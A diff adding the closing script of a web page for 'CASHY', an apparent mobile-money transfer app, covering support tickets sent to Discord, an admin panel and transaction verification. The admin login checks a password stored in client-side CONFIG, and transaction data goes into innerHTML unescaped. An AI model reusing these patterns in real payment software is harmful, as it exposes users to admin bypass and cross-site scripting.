+        // ============================
+        async function submitTicket() {
+            const phone = document.getElementById('ticketPhone').value;
+            const details = document.getElementById('ticketDetails').value;
+            
+            if (!validatePhone(phone)) {
+                showToast('Please enter a valid phone number (01XXXXXXXXX)', 'error');
+                document.getElementById('ticketPhone').focus();
+                return;
+            }
+            
+            if (!details.trim()) {
+                showToast('Please describe your issue in detail', 'error');
+                document.getElementById('ticketDetails').focus();
+                return;
+            }
+            
+            const success = await sendTicketToDiscord(state.transaction, phone, details);
+            
+            if (success) {
+                document.getElementById('ticketTrxId').textContent = state.transaction.transactionId;
+                document.getElementById('ticketPhoneNumber').textContent = phone;
+                document.getElementById('ticketTime').textContent = new Date().toLocaleString();
+                document.getElementById('ticketModal').classList.add('active');
+                
+                document.getElementById('ticketPhone').value = '';
+                document.getElementById('ticketDetails').value = '';
+                
+                showToast('Ticket submitted successfully! Our team will contact you shortly.', 'success');
+            } else {
+                showToast('Failed to submit ticket. Please try again or call the operator.', 'error');
+            }
+        }
+
+        // ============================
+        // STEP 7: SUCCESS PAGE
+        // ============================
+        function startNewTransaction() {
+            document.getElementById('senderPhone').value = '';
+            document.getElementById('recipientPhone').value = '';
+            document.getElementById('amount').value = '';
+            document.getElementById('ticketPhone').value = '';
+            document.getElementById('ticketDetails').value = '';
+            
+            document.querySelectorAll('.platform-option').forEach(opt => {
+                opt.classList.remove('selected');
+            });
+            
+            document.getElementById('amountDisplay').textContent = '0 BDT';
+            document.getElementById('feeDisplay').textContent = '0 BDT';
+            document.getElementById('totalDisplay').textContent = '0 BDT';
+            
+            state.transaction = {
+                senderPhone: '',
+                senderPlatform: '',
+                recipientPhone: '',
+                recipientPlatform: '',
+                amount: 0,
+                fee: 0,
+                total: 0,
+                transactionId: '',
+                timestamp: '',
+                status: 'pending'
+            };
+            
+            goToStep(1);
+            
+            showToast('Ready for new transaction!', 'info');
+        }
+
+        // ============================
+        // ADMIN PANEL FUNCTIONS
+        // ============================
+        function showPasswordModal() {
+            document.getElementById('passwordModal').classList.add('active');
+            document.getElementById('adminPassword').focus();
+        }
+
+        function hidePasswordModal() {
+            document.getElementById('passwordModal').classList.remove('active');
+            document.getElementById('adminPassword').value = '';
+            document.getElementById('passwordError').textContent = '';
+        }
+
+        function checkPassword() {
+            const password = document.getElementById('adminPassword').value;
+            
+            if (password === CONFIG.ADMIN_PASSWORD) {
+                hidePasswordModal();
+                
+                document.getElementById('mainApp').classList.add('hidden');
+                document.getElementById('adminPanel').classList.remove('hidden');
+                
+                refreshAdminData();
+                showToast('Welcome to Admin Panel', 'success');
+            } else {
+                document.getElementById('passwordError').textContent = 'Incorrect password!';
+                document.getElementById('adminPassword').value = '';
+                document.getElementById('adminPassword').focus();
+                document.getElementById('adminPassword').classList.add('shake');
+                setTimeout(() => {
+                    document.getElementById('adminPassword').classList.remove('shake');
+                }, 500);
+            }
+        }
+
+        function goBackToApp() {
+            document.getElementById('adminPanel').classList.add('hidden');
+            document.getElementById('mainApp').classList.remove('hidden');
+            showToast('Back to main application', 'info');
+        }
+
+        function refreshAdminData() {
+            const transactions = getTransactions();
+            const stats = getStats();
+            
+            document.getElementById('totalTransactions').textContent = stats.total;
+            document.getElementById('totalAmount').textContent = stats.totalAmount;
+            document.getElementById('pendingTransactions').textContent = stats.pending;
+            document.getElementById('verifiedTransactions').textContent = stats.verified;
+            
+            const tableBody = document.getElementById('transactionsTableBody');
+            tableBody.innerHTML = '';
+            
+            transactions.slice().reverse().forEach(transaction => {
+                const row = document.createElement('tr');
+                
+                const status = transaction.status === 'verified' 
+                    ? '<span class="status-badge status-verified">Verified</span>'
+                    : '<span class="status-badge status-pending">Pending</span>';
+                
+                const action = transaction.status === 'pending' 
+                    ? `<button class="action-btn" onclick="verifyTransaction('${transaction.transactionId}')">Verify</button>`
+                    : '<button class="action-btn" disabled>Verified</button>';
+                
+                row.innerHTML = `
+                    <td><code>${transaction.transactionId}</code></td>
+                    <td>${transaction.senderPhone}<br><small class="text-muted">${formatPlatform(transaction.senderPlatform)}</small></td>
+                    <td>${transaction.recipientPhone}<br><small class="text-muted">${formatPlatform(transaction.recipientPlatform)}</small></td>
+                    <td>${formatAmount(transaction.amount)} BDT</td>
+                    <td>${status}</td>
+                    <td>${new Date(transaction.timestamp).toLocaleDateString()}</td>
+                    <td>${new Date(transaction.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</td>
+                    <td>${action}</td>
+                `;
+                
+                tableBody.appendChild(row);
+            });
+            
+            if (transactions.length === 0) {
+                tableBody.innerHTML = `
+                    <tr>
+                        <td colspan="8" style="text-align: center; padding: 40px;">
+                            <div style="color: var(--text-muted);">
+                                <i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 16px; opacity: 0.5;"></i>
+                                <p>No transactions yet</p>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+            }
+        }
+
+        function verifyTransaction(transactionId) {
+            if (confirm(`Are you sure you want to verify transaction ${transactionId}? This action cannot be undone.`)) {
+                if (updateTransactionStatus(transactionId, 'verified')) {
+                    refreshAdminData();
+                    showToast('Transaction verified successfully!', 'success');
+                } else {
+                    showToast('Error verifying transaction.', 'error');
+                }
+            }
+        }
+
+        function showToast(message, type = 'info') {
+            const toast = document.createElement('div');
+            toast.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: ${type === 'success' ? 'var(--primary-green)' : type === 'error' ? '#DC2626' : type === 'warning' ? '#F59E0B' : '#3B82F6'};
+                color: white;
+                padding: 14px 22px;
+                border-radius: var(--radius-md);
+                box-shadow: var(--shadow-lg);
+                z-index: 9999;
+                font-weight: 600;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                animation: slideIn 0.3s ease-out;
+                max-width: 400px;
+                word-break: break-word;
+            `;
+            
+            const icon = type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : type === 'warning' ? 'exclamation-triangle' : 'info-circle';
+            toast.innerHTML = `
+                <i class="fas fa-${icon}"></i>
+                <span>${message}</span>
+            `;
+            
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.animation = 'slideOut 0.3s ease-out';
+                setTimeout(() => {
+                    if (toast.parentNode) {
+                        document.body.removeChild(toast);
+                    }
+                }, 300);
+            }, 4000);
+        }
+
+        // ============================
+        // EVENT LISTENERS
+        // ============================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Platform selection
+            document.querySelectorAll('.platform-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    const type = this.dataset.type;
+                    
+                    document.querySelectorAll(`.platform-option[data-type="${type}"]`).forEach(opt => {
+                        opt.classList.remove('selected');
+                    });
+                    
+                    this.classList.add('selected');
+                });
+            });
+            
+            // Phone input formatting
+            document.getElementById('senderPhone').addEventListener('input', function() {
+                this.value = formatPhone(this.value);
+                clearError('senderPhoneError');
+            });
+            
+            document.getElementById('recipientPhone').addEventListener('input', function() {
+                this.value = formatPhone(this.value);
+                clearError('recipientPhoneError');
+            });
+            
+            // Amount calculation in real-time
+            document.getElementById('amount').addEventListener('input', function() {
+                const amount = parseFloat(this.value) || 0;
+                
+                if (amount >= CONFIG.MIN_AMOUNT && amount <= CONFIG.MAX_AMOUNT) {
+                    const fee = parseFloat((amount * CONFIG.FEE_PERCENTAGE).toFixed(2));
+                    const total = amount + fee;
+                    
+                    document.getElementById('amountDisplay').textContent = formatAmount(amount) + ' BDT';
+                    document.getElementById('feeDisplay').textContent = formatAmount(fee) + ' BDT';
+                    document.getElementById('totalDisplay').textContent = formatAmount(total) + ' BDT';
+                    
+                    clearError('amountError');
+                }
+            });
+            
+            // Password input enter key
+            document.getElementById('adminPassword').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    checkPassword();
+                }
+            });
+            
+            // Set YouTube video
+            const youtubeIframe = document.querySelector('.video-container iframe');
+            youtubeIframe.src = `https://www.youtube.com/embed/${CONFIG.YOUTUBE_VIDEO_ID}?autoplay=1&mute=1&controls=1&rel=0&modestbranding=1`;
+            
+            // Add shake animation for wrong password
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes slideIn {
+                    from { transform: translateX(100%); opacity: 0; }
+                    to { transform: translateX(0); opacity: 1; }
+                }
+                @keyframes slideOut {
+                    from { transform: translateX(0); opacity: 1; }
+                    to { transform: translateX(100%); opacity: 0; }
+                }
+                @keyframes shake {
+                    0%, 100% { transform: translateX(0); }
+                    10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+                    20%, 40%, 60%, 80% { transform: translateX(5px); }
+                }
+                .shake {
+                    animation: shake 0.5s ease-in-out;
+                }
+            `;
+            document.head.appendChild(style);
+            
+            // Initialize urgent contact buttons only on step 5 and 6
+            document.querySelectorAll('.urgent-contact a').forEach(link => {
+                link.href = `tel:${CONFIG.OPERATOR_PHONE}`;
+            });
+            
+            // Set constant agent phone number in step 4
+            document.getElementById('paymentPhoneNumber').textContent = CONFIG.AGENT_PHONE;
+            
+            showToast('Welcome to CASHY - Secure Money Transfer', 'info');
+        });
+    </script>
+</body>
+</html>
